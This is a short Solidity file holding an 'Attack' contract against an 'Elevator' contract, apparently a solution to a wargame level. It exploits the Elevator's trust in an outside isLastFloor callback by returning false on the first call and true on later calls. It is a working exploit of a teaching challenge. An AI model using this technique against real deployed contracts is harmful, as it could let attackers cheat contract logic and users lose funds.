// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Attack {
    Elevator public elevatorContract;
    bool toggle; // initial value is false

    constructor(address _elevatorContracts) {
        elevatorContract = Elevator(_elevatorContracts);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        }
        return true;
    }

    function initiateAttack() public {
        elevatorContract.goTo(5);
    }
}
